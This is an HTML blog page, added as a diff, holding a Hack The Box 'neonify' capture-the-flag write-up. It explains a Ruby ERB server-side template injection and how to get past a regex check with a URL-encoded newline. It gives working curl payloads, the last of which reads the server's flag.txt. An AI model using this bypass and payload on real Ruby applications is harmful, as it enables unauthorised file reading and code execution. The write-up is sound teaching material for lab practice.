@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<title>Hackthebox neonify writeup | Home</title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.101.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="css/index.css">
+<link rel="canonical" href="/posts/first-post/">
+<link rel="alternate" type="application/rss+xml" href="" title="Home">
+
+<header>
+  
+    <a href="" class="title">Home</a>
+  
+  
+</header>
+
+<article>
+  <header>
+    <h1>Hackthebox neonify writeup</h1>
+    <time datetime="2022-08-21T00:56:12&#43;05:30">August 21, 2022</time>
+  </header>
+  <h2 id="challenge-description-">Challenge Description :</h2>
+<blockquote>
+<p>Name : neonify</p>
+</blockquote>
+<blockquote>
+<p>Difficulty : Easy</p>
+</blockquote>
+<blockquote>
+<p>Points : 20</p>
+</blockquote>
+<blockquote>
+<h1 id="-its-time-for-a-shiny-new-reveal-for-the-first-ever-text-neonifier-come-test-out-our-brand-new-website-and-make-any-text-glow-like-a-lo-fi-neon-tube">“ It’s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!“</h1>
+</blockquote>
+<p><strong>What’s This?</strong></p>
+<p>The website takes input from the user and styles it in neon</p>
+<p><img src="https://cdn-images-1.medium.com/max/3724/1*B_e7cLnf78vSNoj3fjSikQ.png" alt=""></p>
+<p>Looking at the code Shows it runs ruby in the backend and checks for the user input using regex is between a-z and 0–9.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*NwncYfl_aO3xI0QE2K_W5Q.png" alt=""></p>
+<p>A quick Google search showed ERB is a templating system for ruby.</p>
+<p>**What is that? **</p>
+<p>-A user can run Ruby code in the plaintext document. As shown in the image</p>
+<p><a href="https://docs.ruby-lang.org/en/2.3.0/ERB.html">https://docs.ruby-lang.org/en/2.3.0/ERB.html</a></p>
+<p><img src="https://cdn-images-1.medium.com/max/3648/1*WKDvzXOF9ppnMvp56gIeHw.png" alt=""></p>
+<p><strong>Vulnerability: Server-side Template Injection (SSTI)</strong></p>
+<p>What is that?</p>
+<p>As the name suggests an attacker can run a user native template syntax to inject the malicious payload on the server-side. This happens when the user-provided input is directly concatenated into the template.</p>
+<p>Ex: If we provide <code>&lt;%= 7 * 7 %&gt;</code> as the user input and the server runs this as a template and returns the provided user input it will Produce 7*7=49  Output.</p>
+<p>When we tried to inject this we get the error</p>
+<p><img src="https://cdn-images-1.medium.com/max/2460/1*dybzTXRFiqL3DeeggFsDDQ.png" alt=""></p>
+<p>It’s because the regex is validating the user input is between 0–9 or a-z</p>
+<p>We can search the google Ruby regex Bypass</p>
+<p><a href="https://brakemanscanner.org/docs/warning_types/format_validation/">https://brakemanscanner.org/docs/warning_types/format_validation/</a></p>
+<p><img src="https://cdn-images-1.medium.com/max/3054/1*Uuwnu_5Fo2m4z9unR9R_MQ.png" alt=""></p>
+<p>An attacker can bypass this regex validator using the \n character</p>
+<p><strong>Approach :</strong></p>
+<p>The user input is sent to the server using POST Request using the in the form means application/x-www-form-encoded so we can build a payload in the URL Encode.</p>
+<p>Anything after <code>\n</code> is skipped in the regex.</p>
+<p><code>%0A = \n</code></p>
+<p>Payload :</p>
+<pre><code>curl -X POST -H &quot;Content-Type:application/x-www-form-urlencoded&quot;  -d &quot;neon=lol%0iamhere&quot; [http://159.65.81.40:30169/](http://159.65.81.40:30169/)
+</code></pre>
+<p><img src="https://cdn-images-1.medium.com/max/2320/1*PQuIVHFY7TU969Ho_-MJXA.png" alt=""></p>
+<p>Test if actually vulnerable :</p>
+<pre><code>curl -X POST -H &quot;Content-Type:application/x-www-form-urlencoded&quot;  -d &quot;neon=lol%0A&lt;%= 7*7 %&gt;&quot; [http://159.65.81.40:30169/](http://159.65.81.40:30169/)
+</code></pre>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*TyFfzRALeFSa9rHJlIro8w.png" alt=""></p>
+<p>Yes, it is !!</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*FShlRl5mkFtlf-ZPvutWGg.gif" alt=""></p>
+<p>As the flag lies in the same directory as in the code let&rsquo;s grab a Flag.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*L1yNYsTdS2K7GKUm82fRsQ.png" alt=""></p>
+<p><em><strong>Final Payload :</strong></em></p>
+<pre><code>curl -X POST -H &quot;Content-Type:application/x-www-form-urlencoded&quot;  -d &quot;neon=lol%0A%3C%25%3D+File.open%28%27flag.txt%27%29.read+%25%3E&quot; [http://159.65.81.40:30169/](http://159.65.81.40:30169/)
+</code></pre>
+<p><img src="https://cdn-images-1.medium.com/max/2138/1*zcFuWFkzLdkqB6GZxqYBaw.png" alt=""></p>
+<blockquote>
+<h1 id="pwned"><strong>Pwned!</strong></h1>
+</blockquote>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*U7mCeT-gaQxdsThE9jXHSQ.png" alt=""></p>
+
+</article>
+
+
+
+</html>
